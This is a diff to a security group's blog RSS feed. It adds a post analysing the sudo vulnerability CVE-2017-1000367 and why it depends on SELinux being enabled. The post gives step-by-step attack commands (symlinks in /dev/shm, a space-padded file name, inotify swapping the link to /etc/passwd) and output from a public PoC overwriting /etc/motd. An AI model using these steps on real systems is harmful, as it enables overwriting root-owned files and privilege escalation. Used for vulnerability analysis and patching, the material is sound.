@@ -7,8 +7,225 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>ja-JP</language>
     <copyright>SOSS SIG all rights reserved. 2016</copyright>
-    <lastBuildDate>Thu, 08 Jun 2017 09:53:10 +0900</lastBuildDate>
+    <lastBuildDate>Sat, 24 Jun 2017 02:33:08 +0900</lastBuildDate>
     <atom:link href="https://jsoss-sig.github.io/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>sudo vulnerability detail with SELinux(CVE-2017-1000367/CVE-2017-1000368)</title>
+      <link>https://jsoss-sig.github.io/post/omok-selinux-sudo-20170624/</link>
+      <pubDate>Sat, 24 Jun 2017 02:33:08 +0900</pubDate>
+      
+      <guid>https://jsoss-sig.github.io/post/omok-selinux-sudo-20170624/</guid>
+      <description>
+
+&lt;p&gt;There&amp;rsquo;s much misunderstanding about  &amp;ldquo;sudo&amp;rdquo; vulnerability(CVE-2017-&lt;sup&gt;1000367&lt;/sup&gt;&amp;frasl;&lt;sub&gt;1000368&lt;/sub&gt;) that &amp;ldquo;SELinux caused some vuulnerable&amp;rdquo;. On this blog, we will describe details about tha vulnerability and why it is depending on SELinux.&lt;/p&gt;
+
+&lt;p&gt;(Written by Kazuki Omo:ka-omo@sios.com).&lt;/p&gt;
+
+&lt;h2 id=&#34;vulnerability-details&#34;&gt;Vulnerability Details&lt;/h2&gt;
+
+&lt;p&gt;You can easy to find the details of &amp;ldquo;what is the vulnerability&amp;rdquo; on Qualys Security Advisory(&lt;a href=&#34;http://www.openwall.com/lists/oss-security/2017/05/30/16&#34;&gt;http://www.openwall.com/lists/oss-security/2017/05/30/16&lt;/a&gt;).&lt;/p&gt;
+
+&lt;p&gt;Actually, this vulnerability is completely comes from &amp;ldquo;sudo&amp;rdquo; source code.&lt;/p&gt;
+
+&lt;p&gt;As the description on above Qualys Security Advisory, main problem is &amp;ldquo;sudo behaivor when he get space-contained command&amp;rdquo;.&lt;/p&gt;
+
+&lt;p&gt;When someone run sudo, sudo program will get user information(user_info: uid, cwd, etc.) by calling get_user_info(). And get_user_info() will call sudo_ttyname_dev()-&amp;gt;sudo_ttyname_scan() for device &amp;ldquo;breadth-first scan&amp;rdquo;. During the sudo_ttyname_scan(), it will obtain &amp;ldquo;tty number for that process running&amp;rdquo; by 7th field on &amp;ldquo;/proc/[pid]/stat&amp;rdquo;.&lt;/p&gt;
+
+&lt;p&gt;ex.  When you run mlayer on /dev/pts/0(tty) as pid=2778:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;    jsossug@cent7enc:~$ cat /proc/2778/stat
+    2778 (mplayer) S 2366 2778 2366 34816 2778 1077936128 10433 ....
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;From above output, &amp;ldquo;34816&amp;rdquo; is the dev number.&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&amp;ldquo;34816&amp;rdquo;(Dec) -&amp;gt; &amp;ldquo;0000 0000 0000 0000 1000 1000 0000 0000&amp;rdquo;(BN). Maigor number is &amp;ldquo;31-20 bit + 7-0 bit&amp;rdquo;. Minor number is &amp;ldquo;19-8&amp;rdquo; bit. Then Major number is &amp;ldquo;000010001000 = 136&amp;rdquo;, and Minor number is &amp;ldquo;0000 0000 0000 0000 = 0&amp;rdquo;.
+  .&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;For the confirmation, check &amp;ldquo;ls -l /dev/pts/0&amp;rdquo; output;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;jsossug@cent7enc:~$ ls -l /dev/pts/0
+crw--w---- 1 jsossug tty 136, 0 Jun 22 12:49 /dev/pts/0
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;From above output, you can see &amp;ldquo;136,0&amp;rdquo; which is &amp;ldquo;Major, Minor&amp;rdquo; number.&lt;/p&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;The problem is /proc/[pid]/stat file is &amp;ldquo;space-separated&amp;rdquo; output. So, if someone run &amp;ldquo;cmd&amp;rdquo; which contain space, sudo_ttyname_scan() will treat other field as tty name(this is mainly bug).&lt;/p&gt;
+
+&lt;p&gt;When Malicious attacker will run cmd with 6-spaces, he can easy to change tty number to any number. And if he can change that tty&amp;rsquo;s symbolic link to file, and treat that file as stdout, he can overwrite that file whatever he wants.
+For this sequence, attacker can use sudo&amp;rsquo;s SELinux implementation.&lt;/p&gt;
+
+&lt;h2 id=&#34;how-to-attack&#34;&gt;How to attack&lt;/h2&gt;
+
+&lt;p&gt;Here is the steps for attacking;&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;Create /dev/shm/_tmp which is world-writable directory.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;jsossug@cent7enc:/dev/shm$ mkdir _tmp
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Create symbolic link &amp;ldquo;/dev/shm/_tmp/tty&amp;rdquo; as non-existent pts &amp;ldquo;/dev/pts/57&amp;rdquo;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;jsossug@cent7enc:/dev/shm$ ln -s /dev/pts/57 /dev/shm/_tmp/tty
+jsossug@cent7enc:/dev/shm$ ls -l /dev/shm/_tmp
+lrwxrwxrwx. 1 jsossug jsossug 11  Jun 22 09:02 tty -&amp;gt; /dev/pts/57
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&amp;rdquo;/dev/pts/57&amp;rdquo; device number will be &amp;ldquo;34873&amp;rdquo; as above explanation. So, create symbolic link &amp;ldquo;/dev/shm/_tmp/      34873&amp;rdquo; for &amp;ldquo;/usr/bin/sudo&amp;rdquo;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[jsossug@cent7enc _tmp]$ ln -s /usr/bin/sudo &amp;quot;/dev/shm/_tmp/     34873 &amp;quot;
+[jsossug@cent7enc _tmp]$ ls -l
+lrwxrwxrwx. 1 jsossug jsossug 13  Jun 22 09:07      34873  -&amp;gt; /usr/bin/sudo
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Use inotify for monitoring IN_OPEN on /dev/shm/_tmp directory. When /dev/shm/_tmp directory is accessed, change /dev/shm/_tmp/_tty to file which you want to overwrite(/etc/passwd, for example).&lt;/p&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&#34;so-how-selinux-is-involved-on-this-vulnerability&#34;&gt;So, how SELinux is involved on this vulnerability?&lt;/h2&gt;
+
+&lt;p&gt;On above step 4, sudo program will think his tty is &amp;ldquo;/dev/shm/_tmp&amp;rdquo; which is linked to &amp;ldquo;/etc/passwd&amp;rdquo;.&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;If SELinux is enabled on the system&lt;strong&gt;(doesn&amp;rsquo;t matter Enforcing or Permissive)&lt;/strong&gt;, and &amp;ldquo;-r Role&amp;rdquo; option is specified , exec_setup() in sudo will call selinux_setup();&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;bool
+exec_setup(struct command_details *details, const char *ptyname, int ptyfd)
+{
+--snip-- 
+#ifdef HAVE_SELINUX
+    if (ISSET(details-&amp;gt;flags, CD_RBAC_ENABLED)) {
+        if (selinux_setup(details-&amp;gt;selinux_role, details-&amp;gt;selinux_type,
+            ptyname ? ptyname : user_details.tty, ptyfd) == -1)
+            goto done;
+    }
+#endif
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;selinux_setup() will call relabel_tty() for relabeling the tty;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;int
+selinux_setup(const char *role, const char *type, const char *ttyn,
+    int ptyfd)
+{
+--snip--
+    if (relabel_tty(ttyn, ptyfd) &amp;lt; 0) {
+        warning(_(&amp;quot;unable to setup tty context for %s&amp;quot;), se_state.new_context);
+        goto done;
+    }
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;During the relabel_tty(), program will re-open ttyn which is now &amp;ldquo;/etc/passwd&amp;rdquo;.
+    &amp;ndash;snip&amp;ndash;
+            /* Re-open tty to get new label and reset std{in,out,err} */
+            close(se_state.ttyfd);
+            se_state.ttyfd = open(ttyn, O_RDWR|O_NONBLOCK);
+    &amp;ndash;snip&amp;ndash;&lt;/p&gt;
+
+&lt;p&gt;And call dup2(se_state.ttyfd, ptyfd) for duplicating fd.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;--snip--
+                for (fd = STDIN_FILENO; fd &amp;lt;= STDERR_FILENO; fd++) {
+                    if (isatty(fd) &amp;amp;&amp;amp; dup2(se_state.ttyfd, fd) == -1) {
+--snip--
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Then stdin/stdout/stderr will be set as /etc/passwd. So now the &amp;ldquo;cmd&amp;rdquo; stdout/stderr will be /etc/passwd, then you can overwrite /etc/passwd if you control the cmd output!!&lt;/p&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&#34;poc-with-selinux-enabled&#34;&gt;PoC with SELinux enabled.&lt;/h2&gt;
+
+&lt;p&gt;PoC is available on the Internet. In here, we use /etc/motd(only root can write) for attack file. And use &amp;ldquo;/usr/bin/sum&amp;rdquo; for the command, then add /usr/bin/sum as permitted command for &amp;ldquo;sudovul(test user)&amp;rdquo;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;    sudovul ALL=(ALL)NOPASSWD:/usr/bin/sum
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;Confirm SELinux is Permissive mode;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;sudovul@cent7enc:~# getenforce
+Permissive
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Run PoC on localhost as sudovul;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt; [sudovul@cent7enc sudo-CVE-2017-1000367]$ ./sudopwn
+ [sudovul@cent7enc sudo-CVE-2017-1000367]$ cat /etc/motd
+ /usr/bin/sum: unrecognized option &#39;--
+ HELLO
+ WORLD
+ &#39;
+ Try &#39;/usr/bin/sum --help&#39; for more information.
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Change SELinux to Enforcing mode;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;sudovul@cent7enc:~# getenforce
+Enforcing
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Clear /etc/motd and run PoC on localhost as sudovul;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt; [sudovul@cent7enc sudo-CVE-2017-1000367]$ ./sudopwn
+ [sudovul@cent7enc sudo-CVE-2017-1000367]$ cat /etc/motd
+ /usr/bin/sum: unrecognized option &#39;--
+ HELLO
+ WORLD
+ &#39;
+ Try &#39;/usr/bin/sum --help&#39; for more information.
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;So, we can overwrite /etc/motd in SELinux Permissive/Enforcing Mode.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&#34;poc-with-selinux-disabled&#34;&gt;PoC with SELinux Disabled&lt;/h2&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;set SELinux as Disabled in /etc/selinux/config, and reboot.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root@cent7enc:~# getenforce
+Disabled
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Clear /etc/motd, and run PoC code again.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[sudovul@cent7enc sudo-CVE-2017-1000367]$ ./sudopwn
+/usr/bin/sum: unrecognized option &#39;--
+HELLO
+WORLD
+&#39;
+Try &#39;/usr/bin/sum --help&#39; for more information.
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Check /etc/motd is not modified.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[sudovul@cent7enc sudo-CVE-2017-1000367]$ cat /etc/motd
+[sudovul@cent7enc sudo-CVE-2017-1000367]$ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
+
+&lt;p&gt;From above Vulnerability details and PoC, we can say;&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;The main vulnerability is coming from sudo.&lt;/li&gt;
+&lt;li&gt;SELinux is not exactlly used for the attack. Sudo will open tty and dup the fd for relabeling tty(malicious user can use it for attack).&lt;/li&gt;
+&lt;li&gt;This Vulnerablity condition is &lt;strong&gt;SELinux Enabled(not only Enforcing, but also Permissive.)&lt;/strong&gt;. For fixing the problem, update sudo package.&lt;/li&gt;
+&lt;/ol&gt;
+</description>
+    </item>
     
     <item>
       <title>CVE-2017-5638(Struts2) PoC with SELinux</title>
